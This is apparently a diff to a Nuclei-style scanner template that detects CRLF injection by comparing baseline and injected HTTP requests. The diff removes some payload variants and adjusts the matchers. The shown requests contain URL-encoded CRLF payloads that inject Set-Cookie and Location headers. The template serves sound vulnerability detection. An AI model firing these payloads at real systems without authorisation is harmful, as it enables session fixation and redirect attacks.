@@ -5,16 +5,15 @@ info:
   author: coffin,codex
   severity: high
   description: |
-    Detects CRLF injection by comparing a benign baseline request with an
-    injected request and only reporting when the injected response adds a new
-    standalone Set-Cookie, Location, or custom response header containing a
-    per-scan random marker.
+    Detects practical CRLF injection by comparing a benign baseline request with
+    an injected request and only reporting when the injected response adds a new
+    Set-Cookie, Location, or custom response header containing a per-scan marker.
   reference:
     - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
     - https://docs.projectdiscovery.io/templates/reference/variables
     - https://docs.projectdiscovery.io/templates/reference/helper-functions
   metadata:
-    max-request: 16
+    max-request: 12
     verified: true
   tags: crlf,header-injection,response-splitting
 
@@ -40,15 +39,15 @@ http:
     req-condition: true
     redirects: false
     cookie-reuse: false
-    stop-at-first-match: false
+    stop-at-first-match: true
     matchers:
       - type: dsl
         condition: and
         dsl:
           - "status_code_2 >= 200"
           - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
+          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
+          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
     extractors:
       - type: dsl
         dsl:
@@ -68,43 +67,15 @@ http:
     req-condition: true
     redirects: false
     cookie-reuse: false
-    stop-at-first-match: false
+    stop-at-first-match: true
     matchers:
       - type: dsl
         condition: and
         dsl:
           - "status_code_2 >= 200"
           - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "cookie_name"
-          - "cookie_value"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%250D%250ASet-Cookie:%20{{cookie_name}}={{cookie_value}};%20Path=/ HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: false
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
+          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
+          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
     extractors:
       - type: dsl
         dsl:
@@ -124,15 +95,15 @@ http:
     req-condition: true
     redirects: false
     cookie-reuse: false
-    stop-at-first-match: false
+    stop-at-first-match: true
     matchers:
       - type: dsl
         condition: and
         dsl:
           - "status_code_2 >= 200"
           - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
+          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
+          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
     extractors:
       - type: dsl
         dsl:
@@ -151,69 +122,15 @@ http:
     req-condition: true
     redirects: false
     cookie-reuse: false
-    stop-at-first-match: false
+    stop-at-first-match: true
     matchers:
       - type: dsl
         condition: and
         dsl:
           - "status_code_2 >= 200"
           - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "redirect_host"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%250D%250ALocation:%20https://{{redirect_host}}/ HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: false
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "redirect_host"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%23%0ALocation:%20https://{{redirect_host}}/ HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: false
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\nlocation: https://', to_lower(redirect_host), '/'))"
+          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
+          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
     extractors:
       - type: dsl
         dsl:
@@ -232,15 +149,15 @@ http:
     req-condition: true
     redirects: false
     cookie-reuse: false
-    stop-at-first-match: false
+    stop-at-first-match: true
     matchers:
       - type: dsl
         condition: and
         dsl:
           - "status_code_2 >= 200"
           - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\n', to_lower(header_name), ': ', to_lower(header_value)))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\n', to_lower(header_name), ': ', to_lower(header_value)))"
+          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
+          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
     extractors:
       - type: dsl
         dsl:
@@ -260,15 +177,15 @@ http:
     req-condition: true
     redirects: false
     cookie-reuse: false
-    stop-at-first-match: false
+    stop-at-first-match: true
     matchers:
       - type: dsl
         condition: and
         dsl:
           - "status_code_2 >= 200"
           - "status_code_2 < 400"
-          - "!contains(concat('\n', to_lower(all_headers_1)), concat('\n', to_lower(header_name), ': ', to_lower(header_value)))"
-          - "contains(concat('\n', to_lower(all_headers_2)), concat('\n', to_lower(header_name), ': ', to_lower(header_value)))"
+          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
+          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
     extractors:
       - type: dsl
         dsl:
